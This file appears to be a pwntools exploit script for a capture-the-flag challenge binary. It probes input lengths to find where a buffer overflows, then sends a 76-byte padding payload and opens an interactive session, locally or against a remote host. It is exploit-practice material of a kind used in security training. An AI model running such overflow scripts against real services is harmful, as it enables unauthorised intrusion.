from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)


exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
sh = start()
'''
for i in range(32, 101):
    try:
        sh = start()
        bytess = '{}'.format(i)
        pay = b'A' * int(bytess)
        sh.sendlineafter('?',pay)
        get = sh.recvline()
        print(get)
    except EOFError:
        pass
'''
#32, 53, 54, 75, 76
pay = flat([
    b'A' * 76
])
sh.sendlineafter('?', pay)
sh.interactive()
